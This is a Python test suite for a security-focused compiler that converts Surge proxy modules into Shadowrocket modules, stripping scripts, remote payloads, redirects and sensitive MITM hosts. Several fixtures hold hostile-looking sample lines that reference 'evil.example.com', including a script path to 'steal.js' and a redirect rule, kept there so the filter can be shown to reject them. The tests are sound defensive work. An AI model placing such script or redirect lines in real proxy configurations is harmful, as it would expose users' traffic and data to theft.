"""Regression and security tests for the fail-closed compiler."""
import hashlib
import json
import tempfile
import unittest
from pathlib import Path
from tempfile import TemporaryDirectory

from scripts.shadowrocket_build import (
    compile_module,
    gate,
    normal_sections,
    parse_maps,
    parse_mitm,
    parse_rewrites,
    parse_rules,
    output_path,
    validate_output,
)


class ModuleCompilerTests(unittest.TestCase):
    def test_rule_whitelist_and_surge_options(self):
        bad = []
        result = parse_rules([
            "DOMAIN, ads.example.com, REJECT, extended-matching, pre-matching",
            "DOMAIN-SUFFIX, tracker.example.org, REJECT",
            "DOMAIN, api.apple.com, REJECT",
            "DOMAIN-SUFFIX, bank, REJECT",
            "DOMAIN, proxy.example.com, DIRECT",
            "DOMAIN, ads.example.com, REJECT",
        ], bad)
        self.assertEqual(result, [
            "DOMAIN, ads.example.com, REJECT",
            "DOMAIN-SUFFIX, tracker.example.org, REJECT",
        ])
        self.assertEqual(len(bad), 3)

    def test_url_rewrites_are_only_blocking(self):
        bad = []
        got = parse_rewrites([
            r"^https:\/\/ads\.example\.com\/v1 - reject",
            r"^https:\/\/safe\.example\.com\/ https://evil.example.com/ 302",
            r"^http:\/\/ads\.example\.com\/ - reject-dict",
        ], bad)
        self.assertEqual(len(got), 2)
        self.assertEqual(len(bad), 1)

    def test_map_local_no_remote_payloads(self):
        bad = []
        got = parse_maps([
            r'^https:\/\/example\.com\/ad data-type=json data="{}" status-code=200',
            r'^https:\/\/example\.com\/ad2 data-type=file data="https://evil.example.com/" status-code=200',
        ], bad)
        self.assertEqual(len(got), 1)
        self.assertIn("data-type=text", got[0])
        self.assertEqual(len(bad), 1)

    def test_mitm_cannot_include_sensitive_hosts(self):
        bad = []
        got = parse_mitm(["hostname= %APPEND% api.example.com, *.icloud.com"], bad)
        self.assertEqual(got, ["api.example.com"])
        self.assertEqual(len(bad), 1)

    def test_script_removed_and_metadata_provenance(self):
        sample = r"""#!name=Weibo test
[Rule]
DOMAIN, ads.example.com, REJECT, extended-matching
[URL Rewrite]
^https:\/\/example\.com\/log - reject
[Map Local]
^https:\/\/example\.com\/ad data-type=json data="{}" status-code=200
[Script]
mine = type=http-response,pattern=^https,script-path=https://evil.example.com/steal.js
[MITM]
hostname= %APPEND% api.example.com
"""
        result, report = compile_module(Path("weibo.sgmodule"), Path("App/W/微博/weibo.sgmodule"), sample)
        self.assertIsNotNone(result)
        self.assertNotIn("script-path=", result)
        self.assertNotIn("[Script]", result)
        self.assertIn("hostname = %APPEND% api.example.com", result)
        self.assertEqual(report["scripts_omitted"], 1)
        self.assertEqual(report["maps"], 1)

    def test_only_comments_do_not_publish(self):
        data, report = compile_module(
            Path("test.sgmodule"), Path("App/test.sgmodule"),
            "#!name=script-only\n[Script]\nx=type=cron,script-path=https://example.com/a.js",
        )
        self.assertIsNone(data)
        self.assertEqual(report["scripts_omitted"], 1)

    def test_unknown_sections_not_executed(self):
        data, report = compile_module(
            Path("test.sgmodule"), Path("App/test.sgmodule"),
            "[General]\nsomething=bad\n[Rule]\nDOMAIN,ads.example.com,REJECT\n",
        )
        self.assertNotIn("[General]", data)
        self.assertIn("General", report["unsupported"])

    def make_tree(self, root: Path, *, script_hash: str = "a", mitm_extra: bool = False):
        modules = {}
        for i in range(25):
            name = f"App/T/test{i}.module"
            file = root / name
            file.parent.mkdir(parents=True, exist_ok=True)
            content = (
                f"#!name=Test{i}\n[Rule]\nDOMAIN, ad{i}.example.com, REJECT\n"
                "[MITM]\nhostname = %APPEND% api.example.com"
                + (", added.example.com" if mitm_extra and i == 0 else "")
                + "\n"
            )
            file.write_text(content, encoding="utf-8")
            modules[name] = {"sha256": hashlib.sha256(content.encode()).hexdigest()}
        (root / "manifest.json").write_text(json.dumps({
            "generated_modules": 25,
            "modules": modules,
            "scripts_sha256": {"weibo.js": script_hash}
        }), encoding="utf-8")

    def test_category_output_paths(self):
        self.assertEqual(output_path(Path("Applet/Wechat/B/便利蜂/a.sgmodule")).as_posix(),
                         "Applet/Wechat/B/便利蜂/a.module")
        self.assertEqual(output_path(Path("Applet/Alipay/A/a.sgmodule")).as_posix(),
                         "Applet/Alipay/A/a.module")
        self.assertEqual(output_path(Path("Web/W/site.sgmodule")).as_posix(),
                         "Web/W/site.module")

    def test_invalid_checksum_rejected(self):
        with TemporaryDirectory() as d:
            folder = Path(d)
            self.make_tree(folder)
            module = folder / "App/T/test1.module"
            module.write_text(module.read_text() + "tamper", encoding="utf-8")
            with self.assertRaisesRegex(ValueError, "checksum"):
                validate_output(folder)

    def test_gate_no_change(self):
        with TemporaryDirectory() as d:
            old, new = Path(d) / "old", Path(d) / "new"
            self.make_tree(old)
            self.make_tree(new)
            self.assertEqual(gate(old, new)[0], "none")

    def test_gate_script_change_review(self):
        with TemporaryDirectory() as d:
            old, new = Path(d) / "old", Path(d) / "new"
            self.make_tree(old)
            self.make_tree(new, script_hash="changed")
            self.assertEqual(gate(old, new)[0], "review")

    def test_gate_mitm_expansion_review(self):
        with TemporaryDirectory() as d:
            old, new = Path(d) / "old", Path(d) / "new"
            self.make_tree(old)
            self.make_tree(new, mitm_extra=True)
            self.assertEqual(gate(old, new)[0], "review")

    def test_gate_with_mass_deletion_fails(self):
        with TemporaryDirectory() as d:
            old, new = Path(d) / "old", Path(d) / "new"
            self.make_tree(old)
            self.make_tree(new)
            for p in list(new.rglob("*.module"))[:4]:
                p.unlink()
            with self.assertRaises(ValueError):
                gate(old, new)


if __name__ == "__main__":
    unittest.main()
